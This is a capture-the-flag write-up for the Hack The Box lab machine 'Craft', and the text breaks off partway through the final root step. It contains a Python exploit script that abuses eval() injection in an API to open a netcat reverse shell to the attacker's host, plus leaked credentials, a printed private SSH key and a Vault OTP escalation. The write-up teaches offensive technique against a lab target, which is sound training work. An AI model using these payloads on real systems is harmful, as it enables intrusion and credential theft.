Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-01-04 00:11 EST
Stats: 0:00:12 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Connect Scan
Connect Scan Timing: About 59.20% <span class="k">done</span><span class="p">;</span> ETC: 00:11 <span class="o">(</span>0:00:08 remaining<span class="o">)</span>
Stats: 0:00:37 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Script Scan
NSE Timing: About 91.94% <span class="k">done</span><span class="p">;</span> ETC: 00:12 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
Nmap scan report <span class="k">for </span>craft.htb <span class="o">(</span>10.10.10.110<span class="o">)</span>
Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 <span class="o">(</span>RSA<span class="o">)</span>
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 <span class="o">(</span>ED25519<span class="o">)</span>
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>craft.htb/organizationName<span class="o">=</span>Craft/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>49.33 seconds
</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><p>Not much can be done with the <code class="language-plaintext highlighter-rouge">ssh</code> service as we do not have any credentials on hand so lets come back to it later. As for the <code class="language-plaintext highlighter-rouge">https</code> service, maybe we can find some information on it ?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/craft1.png" alt="" /></p><p>Nothing much here except for the <code class="language-plaintext highlighter-rouge">API</code> and the <code class="language-plaintext highlighter-rouge">git</code> icon on the top right. Lets first check out the <code class="language-plaintext highlighter-rouge">API</code>.</p><p>It was a link to <code class="language-plaintext highlighter-rouge">https://api.craft.htb/api/</code>, hence we had to add <code class="language-plaintext highlighter-rouge">api.craft.htb</code> to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> for the page to be resolved properly.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
...
10.10.10.110 craft.htb api.craft.htb
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/craft2.png" alt="" /></p><p>After playing around with some of the different APIs, what caught my attention was <code class="language-plaintext highlighter-rouge">/auth/login</code>. Upon clicking on <code class="language-plaintext highlighter-rouge">Execute</code>, I was prompted for credentials.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/craft3.png" alt="" /></p><p>Since I did not have any credentials, I decided to put this on hold for now. Lets move on the <code class="language-plaintext highlighter-rouge">git</code> icon. It was a link to <code class="language-plaintext highlighter-rouge">https://gogs.craft.htb</code>, hence we need to modify our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> again.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
...
10.10.10.110 craft.htb api.craft.htb gogs.craft.htb
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/craft4.png" alt="" /></p><p>So this website is like a private github of some sort? By clicking on <code class="language-plaintext highlighter-rouge">Explore</code>, we are able to list all the public repositories, users and organisations on the website.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/craft5.png" alt="" /></p><p>Oh we found something! There is a repository that might be related to <code class="language-plaintext highlighter-rouge">https://api.craft.htb/api</code>!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/craft6.png" alt="" /></p><p>This repository seems to contain the source code. Lets try looking around.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/craft7.png" alt="" /></p><p>There was an issue posted which contained the API token, but sadly was expired. In the commits history, I found some credentials!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/craft8.png" alt="" /></p><p>Looks like Dinesh accidentally commited his credentials and tried to cover it up haha. To check if the credentials are still valid, we returned to <code class="language-plaintext highlighter-rouge">https://api.craft.htb/api/</code> and key them into the prompt for the <code class="language-plaintext highlighter-rouge">/auth/login</code> feature.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/craft9.png" alt="" /></p><p>We managed to get a valid API token! Not much can be done now so I decided to look at the source code for any vulnerabilites.</p><h1 id="exploitation-1">Exploitation (1)</h1><p>On <code class="language-plaintext highlighter-rouge">https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/api/brew/endpoints/brew.py</code>, there was a certain section that caught my eye.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="o">@</span><span class="n">ns</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
<span class="k">class</span> <span class="nc">BrewCollection</span><span class="p">(</span><span class="n">Resource</span><span class="p">):</span>
    <span class="p">...</span>
    <span class="o">@</span><span class="n">auth</span><span class="p">.</span><span class="n">auth_required</span>
    <span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">expect</span><span class="p">(</span><span class="n">beer_entry</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">post</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="s">"""
        Creates a new brew entry.
        """</span>

        <span class="c1"># make sure the ABV value is sane.
</span>        <span class="k">if</span> <span class="nb">eval</span><span class="p">(</span><span class="s">'%s &gt; 1'</span> <span class="o">%</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]):</span>
            <span class="k">return</span> <span class="s">"ABV must be a decimal value less than 1.0"</span><span class="p">,</span> <span class="mi">400</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">create_brew</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">)</span>
            <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="mi">201</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">eval</code> was being called with input from the <code class="language-plaintext highlighter-rouge">abv</code> field in the sent JSON for the <code class="language-plaintext highlighter-rouge">/brew/</code> route. This means that whatever <code class="language-plaintext highlighter-rouge">python</code> expression we enter in the <code class="language-plaintext highlighter-rouge">abv</code> field, it will be executed. Hm…</p><p>I decided to search for how to achieve reverse shell from the <code class="language-plaintext highlighter-rouge">eval</code> function and I found this <a href="https://stackoverflow.com/questions/59519289/python-running-reverse-shell-inside-eval">post</a> on StackOverflow.</p><p>When <code class="language-plaintext highlighter-rouge">"__import__('os').system('nc 10.10.XX.XX -e /bin/sh')"</code> is inputted into <code class="language-plaintext highlighter-rouge">eval</code>, it will cause the box to connect back to us. I used the below <code class="language-plaintext highlighter-rouge">python</code> script to assist in the sending of the payload.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">authtoken</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/login'</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">'dinesh'</span><span class="p">,</span> <span class="s">'4aUh0A8PbVJxgd'</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">).</span><span class="n">json</span><span class="p">()[</span><span class="s">"token"</span><span class="p">]</span>

<span class="n">exploit</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'abv'</span><span class="p">:</span><span class="s">"__import__(</span><span class="se">\'</span><span class="s">os</span><span class="se">\'</span><span class="s">).system(</span><span class="se">\'</span><span class="s">nc 10.10.XX.XX 1337 -e /bin/sh</span><span class="se">\'</span><span class="s">)"</span><span class="p">,</span>
        <span class="s">"brewer"</span><span class="p">:</span> <span class="s">"string"</span><span class="p">,</span>
        <span class="s">"name"</span><span class="p">:</span> <span class="s">"string"</span><span class="p">,</span>
        <span class="s">"style"</span><span class="p">:</span> <span class="s">"string"</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'X-Craft-Api-Token'</span><span class="p">:</span> <span class="n">authtoken</span><span class="p">}</span>

<span class="k">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/brew/'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">exploit</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">).</span><span class="n">content</span><span class="p">)</span>

</pre></table></code></div></div><p>With the script ready, we start our listener:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
</pre></table></code></div></div><p>And run our exploit script. Back on our listener, we catch the connection. Wait, we are already root?</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>listening on <span class="o">[</span>any] 1337 ...                                         
connect to <span class="o">[</span>10.10.XX.XX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.110] 46345                       
<span class="nb">id 
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1<span class="o">(</span>bin<span class="o">)</span>,2<span class="o">(</span>daemon<span class="o">)</span>,3<span class="o">(</span>sys<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,6<span class="o">(</span>disk<span class="o">)</span>,10<span class="o">(</span>wheel<span class="o">)</span>,11<span class="o">(</span>floppy<span class="o">)</span>,20<span class="o">(</span>dialout<span class="o">)</span>,26<span class="o">(</span>tape<span class="o">)</span>,27<span class="o">(</span>video<span class="o">)</span>
</pre></table></code></div></div><p>There was no <code class="language-plaintext highlighter-rouge">root.txt</code> at <code class="language-plaintext highlighter-rouge">/root</code>, so what is going on?</p><h1 id="enumeration-2">Enumeration (2)</h1><p>Lets try running <a href="https://github.com/rebootuser/LinEnum"><code class="language-plaintext highlighter-rouge">LinEnum</code></a> to get some insights.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir </span>httpserver
<span class="nv">$ </span><span class="nb">cd </span>httpserver
<span class="nv">$ </span><span class="nb">cp</span> ~/LinEnum.sh <span class="nb">.</span>
<span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>wget http://10.10.XX.XX/LinEnum.sh
<span class="nb">chmod</span> +x LinEnum.sh
./LinEnum.sh
...
<span class="o">[</span>+] Looks like we<span class="s1">'re in a Docker container:
10:cpuset:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
9:freezer:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
8:memory:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
7:devices:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
6:pids:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
5:blkio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
4:perf_event:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
3:net_cls,net_prio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
2:cpu,cpuacct:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
1:name=systemd:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
-rwxr-xr-x    1 root     root             0 Feb 10  2019 /.dockerenv
</span></pre></table></code></div></div><p>Ahh I see, we are in a Docker container. We might need to escape from it if we want to get our flags :P</p><p>Looking back at the repository on <code class="language-plaintext highlighter-rouge">https://gogs.craft.htb</code>, there was a <code class="language-plaintext highlighter-rouge">.gitignore</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>*.pyc
settings.py
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">settings.py</code> seemed interesting. It was located at <code class="language-plaintext highlighter-rouge">/opt/app/craft_api</code> and it contained a lot of juicy information.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c1"># Flask settings
</span><span class="n">FLASK_SERVER_NAME</span> <span class="o">=</span> <span class="s">'api.craft.htb'</span>
<span class="n">FLASK_DEBUG</span> <span class="o">=</span> <span class="bp">False</span>  <span class="c1"># Do not use debug mode in production
</span>
<span class="c1"># Flask-Restplus settings
</span><span class="n">RESTPLUS_SWAGGER_UI_DOC_EXPANSION</span> <span class="o">=</span> <span class="s">'list'</span>
<span class="n">RESTPLUS_VALIDATE</span> <span class="o">=</span> <span class="bp">True</span>
<span class="n">RESTPLUS_MASK_SWAGGER</span> <span class="o">=</span> <span class="bp">False</span>
<span class="n">RESTPLUS_ERROR_404_HELP</span> <span class="o">=</span> <span class="bp">False</span>
<span class="n">CRAFT_API_SECRET</span> <span class="o">=</span> <span class="s">'hz66OCkDtv8G6D'</span>

<span class="c1"># database
</span><span class="n">MYSQL_DATABASE_USER</span> <span class="o">=</span> <span class="s">'craft'</span>
<span class="n">MYSQL_DATABASE_PASSWORD</span> <span class="o">=</span> <span class="s">'qLGockJ6G2J75O'</span>
<span class="n">MYSQL_DATABASE_DB</span> <span class="o">=</span> <span class="s">'craft'</span>
<span class="n">MYSQL_DATABASE_HOST</span> <span class="o">=</span> <span class="s">'db'</span>
<span class="n">SQLALCHEMY_TRACK_MODIFICATIONS</span> <span class="o">=</span> <span class="bp">False</span>
</pre></table></code></div></div><p>Nice we got the credentials for a <code class="language-plaintext highlighter-rouge">mysql</code> database service running on the box. According to the model schema found at <code class="language-plaintext highlighter-rouge">https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/database/models.py</code>, there is a <code class="language-plaintext highlighter-rouge">User</code> table containing usernames and passwords.</p><p>We can modify this database testing script at <code class="language-plaintext highlighter-rouge">https://gogs.craft.htb/Craft/craft-api/src/master/dbtest.py</code> to dump out the table.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">pymysql</span>
<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>

<span class="c1"># test connection to mysql database
</span>
<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="p">.</span><span class="n">cursors</span><span class="p">.</span><span class="n">DictCursor</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span> 
    <span class="k">with</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SELECT `id`, `username`, `password` FROM `user`"</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">creds</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">creds</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><p>Running the script gave us more credentials!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>python dbtest_new.py
<span class="o">{</span><span class="s1">'id'</span>: 1, <span class="s1">'username'</span>: <span class="s1">'dinesh'</span>, <span class="s1">'password'</span>: <span class="s1">'4aUh0A8PbVJxgd'</span><span class="o">}</span>
<span class="o">{</span><span class="s1">'id'</span>: 4, <span class="s1">'username'</span>: <span class="s1">'ebachman'</span>, <span class="s1">'password'</span>: <span class="s1">'llJ77D8QFkLPQB'</span><span class="o">}</span>
<span class="o">{</span><span class="s1">'id'</span>: 5, <span class="s1">'username'</span>: <span class="s1">'gilfoyle'</span>, <span class="s1">'password'</span>: <span class="s1">'ZEU3N8WNM2rh4T'</span><span class="o">}</span>
</pre></table></code></div></div><p>Lets try logging in to <code class="language-plaintext highlighter-rouge">https://gogs.craft.htb</code> using these credentials.</p><p>Only <code class="language-plaintext highlighter-rouge">dinesh</code>’s and <code class="language-plaintext highlighter-rouge">gilfoyle</code>’s credentials worked. However, in <code class="language-plaintext highlighter-rouge">gilfoyle</code>’s homepage I noticed another repository but was private.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/craft10.png" alt="" /></p><p>Looking through the repository, I found a <code class="language-plaintext highlighter-rouge">ssh</code> key pair at <code class="language-plaintext highlighter-rouge">https://gogs.craft.htb/gilfoyle/craft-infra/src/master/.ssh/id_rsa</code></p><h1 id="usertxt">user.txt</h1><p>I downloaded the <code class="language-plaintext highlighter-rouge">id_rsa</code>, which is the private key.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z
F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS
zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS
RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx
lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw
pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ
B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi
4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq
Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ
3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K
Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV
ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU
GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5
0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F
5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE
cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5
elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf
CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa
hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB
a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg
MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W
Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS
Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW
I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
6YvpJhnN2SfJC/QftzqZK2MndJrmQ=
-----END OPENSSH PRIVATE KEY-----
</pre></table></code></div></div><p>I attempted to <code class="language-plaintext highlighter-rouge">ssh</code> to the box. The passphrase was <code class="language-plaintext highlighter-rouge">ZEU3N8WNM2rh4T</code>, which was <code class="language-plaintext highlighter-rouge">gilfoyle</code>’s password.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">chmod </span>600 id_rsa
<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa gilfoyle@craft.htb 
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
Linux craft.htb 4.9.0-8-amd64 <span class="c">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan  4 12:04:33 2020 from 10.10.XX.XX
gilfoyle@craft:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
bbf4XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h1 id="enumeration-3">Enumeration (3)</h1><p>In <code class="language-plaintext highlighter-rouge">gilfoyle</code>’s private repository, there was a folder called <code class="language-plaintext highlighter-rouge">vault</code>. Thinking it was a name for a service, I went to search online and found <a href="https://www.vaultproject.io/">this</a>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>A tool for secrets management, encryption as a service, and privileged access management.
</pre></table></code></div></div><p>In the folder, I found a script at <code class="language-plaintext highlighter-rouge">https://gogs.craft.htb/gilfoyle/craft-infra/src/master/vault/secrets.sh</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># set up vault secrets backend</span>

vault secrets <span class="nb">enable </span>ssh

vault write ssh/roles/root_otp <span class="se">\</span>
    <span class="nv">key_type</span><span class="o">=</span>otp <span class="se">\</span>
    <span class="nv">default_user</span><span class="o">=</span>root <span class="se">\</span>
    <span class="nv">cidr_list</span><span class="o">=</span>0.0.0.0/0
</pre></table></code></div></div><p>Hmm… Seem like <code class="language-plaintext highlighter-rouge">vault</code> is being used to store <code class="language-plaintext highlighter-rouge">ssh</code> keys or something? Time to look at the <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">documentation</a>.</p><h1 id="roottxt">root.txt</h1><p>The commands looked pretty similar. Following the <code class="language-plaintext highlighter-rouge">Automate it</code> section, all we have to do is create a new OTP and <code class="language-plaintext highlighter-rouge">ssh</code> into the box.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>vault ssh <span class="nt">-role</span> root_otp <span class="nt">-mode</span> otp root@127.0.0.1
Vault could not locate <span class="s2">"sshpass"</span><span class="nb">.</span> The OTP code <span class="k">for </span>the session is displayed
below. Enter this code <span class="k">in </span>the SSH password prompt. If you <span class="nb">install </span>sshpass,                                         
Vault can automatically perform this step <span class="k">for </span>you.                                                                 
OTP <span class="k">for </span>the session is: f80f58e4-6ec7-dcdf-b491-f2ee66a89260


  <span class="nb">.</span>   <span class="k">*</span>   ..  <span class="nb">.</span> <span class="k">*</span>  <span class="k">*</span>
